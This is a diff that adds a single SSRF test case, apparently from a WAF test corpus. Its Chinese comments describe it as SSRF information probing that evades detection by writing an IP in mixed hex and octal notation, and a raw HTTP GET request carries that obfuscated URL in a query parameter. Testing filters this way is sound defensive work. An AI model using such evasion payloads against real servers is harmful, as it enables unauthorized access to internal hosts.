@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_信息探测(IP混合进制绕过)-06506965
+# 将IP地址转化为其他混合进制数从而绕过检测
+GET /?id=http:%2F%2F0x9c.245.12.053&bid=hd_tag_m8mv24mw HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mw
+RM-PRO-Token: a989e0026db84e4f0889d74d6f976b6e
+RM-PRO-Time: 1742808393180
+User-Agent: curl/7.83.1
+
